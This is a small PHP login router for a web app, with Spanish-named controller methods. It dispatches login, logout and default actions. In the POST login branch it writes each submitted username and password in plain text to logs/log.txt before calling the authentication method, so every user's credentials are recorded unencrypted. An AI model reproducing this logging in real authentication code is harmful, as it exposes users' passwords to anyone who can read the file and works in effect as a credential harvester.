<?php
session_start();
// call login controller


$action = $_GET['action'] ?? '';
$state = $_GET['state'] ?? '';

require_once 'app/controllers/LoginController.php';

$controller = new LoginController();

switch ($action) {
    case 'login':
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $username = $_POST['username'] ?? '';
            $password = $_POST['password'] ?? '';
            $logData = "Username: " . $username . ", Password: " . $password;
            file_put_contents('logs/log.txt', $logData . PHP_EOL, FILE_APPEND);
            $controller->iniciarSesion($username, $password);
        } else {
            $controller->mostrarFormularioLogin();
        }
        break;
    case 'logout':
        $controller->logout();
        break;
    default:
        $controller->mostrarFormularioLogin();
        break;
}






